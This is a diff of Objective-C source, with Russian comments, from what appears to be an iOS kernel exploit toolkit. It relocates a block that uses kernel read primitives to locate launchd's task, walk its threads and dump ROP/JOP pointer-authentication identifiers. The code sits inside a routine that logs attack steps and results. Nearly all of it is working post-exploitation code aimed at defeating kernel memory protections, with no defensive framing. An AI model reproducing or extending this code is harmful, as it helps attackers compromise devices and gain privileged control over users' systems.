@@ -2308,6 +2308,34 @@ static NSString *kpFmtSptmFn(uint64_t raw)
     // не открывался и свопы молча пропускались (step8/step11 не печатались).
     uint64_t ftVA = [self frameTableVAWithLog:r];
     kpNote(r, [NSString stringWithFormat:@"  [ATK] frameTable=%#llx", (unsigned long long)ftVA]);
+    // ---- 2.0.94: только PAC-ключи, без гистограммы (быстро) ----
+    [r appendString:@"=== KCALL-BOOT 2.0.94 ===\n"];
+    {
+        uint64_t ldProc = [self findSelfProcByPidFast:1 log:nil];
+        kpNote(r, [NSString stringWithFormat:@"  [BOOT] launchd proc=%#llx", (unsigned long long)ldProc]);
+        if (kpLooksLikeKernelPointer(ldProc)) {
+            uint64_t ldRo = kp_untag_ptr(early_kread64(ldProc + koffsetof(proc, proc_ro)));
+            uint64_t ldTask = kpLooksLikeKernelPointer(ldRo) ? kp_untag_ptr(early_kread64(ldRo + off_proc_ro_pr_task)) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  [BOOT] launchd task=%#llx", (unsigned long long)ldTask]);
+            if (kpLooksLikeKernelPointer(ldTask)) {
+                uint64_t head = ldTask + off_task_threads_next;
+                uint64_t e = kp_untag_ptr(early_kread64(head));
+                int guardCnt = 0;
+                while (kpLooksLikeKernelPointer(e) && guardCnt++ < 3) {
+                    uint64_t th = e - off_thread_task_threads_next;
+                    if (!kpLooksLikeKernelPointer(th)) { kpNote(r, @"  [BOOT] bad kthread"); break; }
+                    uint64_t rop = 0, jop = 0;
+                    if (off_thread_machine_rop_pid) rop = kp_untag_ptr(early_kread64(th + off_thread_machine_rop_pid));
+                    if (off_thread_machine_jop_pid) jop = kp_untag_ptr(early_kread64(th + off_thread_machine_jop_pid));
+                    kpNote(r, [NSString stringWithFormat:@"  [BOOT] kthread=%#llx rop=%#llx jop=%#llx",
+                              (unsigned long long)th, (unsigned long long)rop, (unsigned long long)jop]);
+                    e = kp_untag_ptr(early_kread64(e));
+                    if (e == head) break;
+                }
+            }
+        }
+    }
+
     kpNote(r, @"  [ATK] step1: resolve proc");
     uint64_t selfProc = [self findSelfProcByPidFast:(uint32_t)getpid() log:r];
     if (!selfProc) { [r appendString:@"[RESULT] АТАКА: FAIL — proc\n"]; return r; }
@@ -3097,34 +3125,6 @@ static NSString *kpFmtSptmFn(uint64_t raw)
         kpNote(r, [NSString stringWithFormat:@"  [C3] scanned=%u inDART=%u altPTEs=%u", nScanned, nInWindow, nAlt]);
         if (nAlt == 0)
             kpNote(r, @"  [C3] второго маппинга нет — ucred виден только через low-RAM PTE");
-    }
-
-    // ---- 2.0.94: только PAC-ключи, без гистограммы (быстро) ----
-    [r appendString:@"=== KCALL-BOOT 2.0.94 ===\n"];
-    {
-        uint64_t ldProc = [self findSelfProcByPidFast:1 log:nil];
-        kpNote(r, [NSString stringWithFormat:@"  [BOOT] launchd proc=%#llx", (unsigned long long)ldProc]);
-        if (kpLooksLikeKernelPointer(ldProc)) {
-            uint64_t ldRo = kp_untag_ptr(early_kread64(ldProc + koffsetof(proc, proc_ro)));
-            uint64_t ldTask = kpLooksLikeKernelPointer(ldRo) ? kp_untag_ptr(early_kread64(ldRo + off_proc_ro_pr_task)) : 0;
-            kpNote(r, [NSString stringWithFormat:@"  [BOOT] launchd task=%#llx", (unsigned long long)ldTask]);
-            if (kpLooksLikeKernelPointer(ldTask)) {
-                uint64_t head = ldTask + off_task_threads_next;
-                uint64_t e = kp_untag_ptr(early_kread64(head));
-                int guardCnt = 0;
-                while (kpLooksLikeKernelPointer(e) && guardCnt++ < 3) {
-                    uint64_t th = e - off_thread_task_threads_next;
-                    if (!kpLooksLikeKernelPointer(th)) { kpNote(r, @"  [BOOT] bad kthread"); break; }
-                    uint64_t rop = 0, jop = 0;
-                    if (off_thread_machine_rop_pid) rop = kp_untag_ptr(early_kread64(th + off_thread_machine_rop_pid));
-                    if (off_thread_machine_jop_pid) jop = kp_untag_ptr(early_kread64(th + off_thread_machine_jop_pid));
-                    kpNote(r, [NSString stringWithFormat:@"  [BOOT] kthread=%#llx rop=%#llx jop=%#llx",
-                              (unsigned long long)th, (unsigned long long)rop, (unsigned long long)jop]);
-                    e = kp_untag_ptr(early_kread64(e));
-                    if (e == head) break;
-                }
-            }
-        }
     }
 
     [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501]/[SPTM]/[C3]/[BOOT] выше\n"];
